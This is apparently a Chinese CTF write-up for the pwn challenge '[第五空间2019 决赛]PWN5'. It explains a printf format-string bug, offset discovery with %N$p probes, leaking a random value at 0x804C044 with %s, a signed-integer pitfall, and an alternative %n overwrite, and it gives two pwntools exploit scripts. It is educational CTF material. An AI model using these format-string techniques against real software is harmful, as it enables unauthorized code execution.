---
title: pwn解题-[第五空间2019 决赛]PWN5
date: 2026-11-04 16:05:07
updated: 2026-11-15 01:14:57
description: "[第五空间2019 决赛]PWN5 的 pwn 解题记录：32 位 No-PIE 程序把用户输入的 name 直接当作 printf 的格式串，造成格式化字符串漏洞；用 %N$s 任意地址读泄露写在固定地址 0x804C044 的 /dev/urandom 随机值，处理有符号补码后用正确的 passwd 通过 atoi 比较拿到 shell。"
categories: CTF
tags:
  - pwn
  - 格式化字符串
  - pwntools
series: PWN · 格式化字符串
order: 1
---

第一次正式遇到格式化字符串的题目，这个内容相比ret2win属于是进阶一点内容

我了个豆

![alt text](/images/posts/pwn5/image-2.png)

32位！第一次见我去

有点难度，存在金丝雀

![alt text](/images/posts/pwn5/image.png)

看main函数：

![alt text](/images/posts/pwn5/image-1.png)

```c
setvbuf(stream: stdout, buf: nullptr, modes: 2, n: 0);
```

关闭标准输出 stdout 的缓冲，使程序输出的数据能够立即写入底层输出通道，而不必等待缓冲区刷新，用于方便输入输出交互（不是漏洞所在）

```c
open("/dev/urandom", 0);   // 打开系统真随机源   ---/dev/urandom 是 Linux 的真随机设备，open（）以只读方式打开文件
```

srand(seed: v1)

这个语句我是第一次见，意思是初始化伪随机数生成器 的语句，作用是使用变量 v1 作为随机数种子（seed）

atoi(nptr) 

是 C 语言中的一个函数调用，作用是：将字符串转换成整数（int 类型）。

可以看到这里有三个读取输入的操作：

```c
read(fd, buf: &dword_804C044, nbytes: 4u)
read(fd: 0, buf, nbytes: 0x63u);
read(fd: 0, buf: nptr, nbytes: 0xFu);
```

继续往下看

想要执行system(/bin/s)  拿到shell

条件是:atoi(nptr) == dword_804C04

过了这个条件判断，对result进行赋值

再次进行一个判断

一开始赋值了v6 = __readgsdword(0x14u)，再次判定__readgsdword(0x14u) != v6，如果__readgsdword(0x14u)发生变化，就会执行sub_80493D0()，看来这个就是这道题目的栈保护啊

说实话，对这个main函数看到现在我还是一知半解，没看懂，有点失败

---

**问Claude：**

重新看一下这个main函数

```c
fd = open("/dev/urandom", 0);
read(fd, &dword_804C044, 4);   // 从真随机源读 4 字节，存进固定全局 0x804C044
read(0, buf, 0x63);            // 你的 name，完全可控
printf(buf);                   // ★ 漏洞：拿用户输入当“格式串”
read(0, nptr, 0xF);            // 你的 passwd
if (atoi(nptr) == dword_804C044) system("/bin/sh");  // 猜中那个随机值就 getshell
```

关键是这个printf(buf)，把用户输入的字符串当作格式串用，只要塞进 %s，它就以为栈上有对应参数，于是去栈上“捡”一个值当指针解引用并打印 —— 这就是“任意地址读”。我们要它去读 0x804C044（No-PIE，地址写死）。

```c
printf("%s", buf);   // 正常:buf 是“要打印的数据”
printf(buf);         // 本题:buf 直接当“格式串”
```

（也许这个就是这类题目名字的来源，printf 的第一个参数叫 format(格式串)，格式化字符串的题目）

srand(time(0)) 是来迷惑你的。真正用来比的值来自 /dev/urandom,跟 rand() 一点关系没有

那么判断 atoi(nptr) == dword_804C044 要成立,必须先知道这个随机数的值。

有三个办法：

1.猜:4 字节 = 2³² ≈ 43 亿种可能,一次次试。

2.预测:找规律算出来。

3.偷看:想办法让程序自己把这个值“吐”给你。

1：概率为0   2：真随机，无规律    只能是3

在main函数里，哪里给了我们偷看的机会？

请看：

```c
read(0, buf, 0x63);   // 你输入的内容进 buf
printf(buf);          // 直接把 buf 当参数交给 printf
```

这里有几个知识点关于这个格式串：

%x / %p → 把栈上某个值当数字打印出来(这叫“泄露栈内容”)

%s → 把栈上某个值当成地址(指针),跑去那个地址把字符串读出来(这叫“任意地址读”)

我们要读的是 dword_804C044——它是个固定地址(No-PIE,每次运行都在 0x804C044)。现在你有了 %s:给它一个地址,它就去那个地址读内容。

现在，如果我把 0x804C044 这 4 个字节,亲手写进 buf 的开头,再用某个 %?$s 正好去取到 buf 开头那 4 字节……那么我们的输入就会被当作地址，从而这个地址的值就会被读取

现在的问题就是，%?$s中的?到底是多少？

%N$s 里的 N,是指“buf 开头那 4 字节,排在 printf 参数队列的第几位”。这叫参数偏移。为什么会有偏移、不是第 1 位?因为栈上在 buf 之前,还夹着一堆别的东西(printf 的返回地址、之前函数调用的残留、局部变量等),buf 得往后排。

找 N 有两种办法：

动态试(最常用):输入 AAAA.%1$p.%2$p.%3$p.%4$p...,一直往后数,看哪一位打印出来的是 0x41414141(也就是 AAAA)。那一位的序号就是 N——因为 AAAA 就在你 buf 开头,它出现的位置就是 buf 开头的偏移。

静态算:照着 main 的栈帧,一个字节一个字节推 buf 相对 printf 第一个参数的距离。精确但费劲。

关于动态试有两个办法：

一、

命令行直接怼

```bash
# 本地
chmod +x chall5 //给文件执行权限
./chall5
# 在 your name 处输入:
AAAA.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p.%11$p.%12$p
```

回显里找哪一段是 0x41414141(AAAA 的十六进制)。比如看到 ...0x8.0x41414141.0x25...,数一下 0x41414141 排在第几个 %N$p,那个 N 就是偏移。

二、

pwntools 全自动(最省事,推荐掌握)

```python
from pwn import *
context.arch = 'i386'
def leak(payload):
    io = process('./chall5')
    io.sendafter(b'your name:', payload)    //io.sendafter(等待的提示内容, 要发送的数据)
    io.recvuntil(b'Hello,')
    return io.recvuntil(b'passwd', drop=True)

off = FmtStr(execute_fmt=leak).offset   # pwntools 自己试出偏移
log.success('offset = %d' % off)
```

整个过程就是利用printf偷看buf上的随机数，再把这个随机数存到nptr里，再拿去做对比判断

---

**还有就是一个符号坑的问题：**

假设 %10$s 泄露到的 4 字节随机值,还原成的 32 位是:

0xC0000001

这 32 个 bit 最高位是 1。同样这串 bit,有两种读法:

当无符号读:0xC0000001 = 3221225473(30 多亿)

当有符号读(补码):0xC0000001 = -1073741823(负数)

关键:程序里 dword_804C044 是 int(有符号),比较用的 cmp,它眼里这个值就是 -1073741823。

现在你要让 atoi(你输入的字符串) == dword。问题来了:

你要是填 "3221225473" → atoi 的返回类型是 int,装不下30 多亿(int 上限才 2147483647),于是被 clamp 成 2147483647(0x7FFFFFFF)。这跟 0xC0000001 的 bit 对不上 → fail。

你要是填 "-1073741823" → atoi 正常返回 -1073741823,补码就是 0xC0000001,跟 dword 的 bit 完全一致 → ok!! ✅

所以，如果 value ≥ 2³¹(最高位是 1,是个“伪大数”),就减 2³² 把它转成对应的负数再填回去;否则(最高位 0,本来就是正常正数)原样用。

---

**写exploit：**

```python
from pwn import *

io = remote("3c5658f830de633c24c5f819.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="3c5658f830de633c24c5f819.tcp-ctf2.dasctf.com")

发泄露 payload
TARGET = 0x804C044
OFFSET = 10
payload = p32(TARGET) + b'%%%d$s' % OFFSET    
io.sendafter(b'your name:', payload)

收回显、抠出随机值
io.recvuntil(b'Hello,')
data = io.recvuntil(b'your passwd:', drop=True)
leak_bytes = data[4:]
leak_bytes = (leak_bytes + b'\x00'*4)[:4]
value = u32(leak_bytes)

处理有符号坑 + 填回去
signed = value - (1 << 32) if value >= (1 << 31) else value
io.sendline(str(signed).encode())   

io.interactive()
```

---

**另一种解法（任意地址写 %n）**

思路与上面正好相反：不去读那个随机数，而是用 `%n` 往 `0x804c044` 写入一个已知值，把随机数覆盖掉，passwd 直接填这个值即可，根本不用知道原来的随机数。以下 exploit 引用自 [https://rocketma.dev/2023/09/19/pwn5/](https://rocketma.dev/2023/09/19/pwn5/)：

```python
from pwn import *
sh = process('pwn5')

# 静态变量randint的地址为0x0804c044
sh.sendline(b'aa$12%nx' + p32(0x0804c044))
# arg10: 'aa$1', arg11: '2%nx', arg12: 0x0804c044
#即将2（成功打印aa 2个字符）写入randint中

sh.sendline(b'2')
sh.interactive()
#输入cat flag取得flag

sh.close()
```
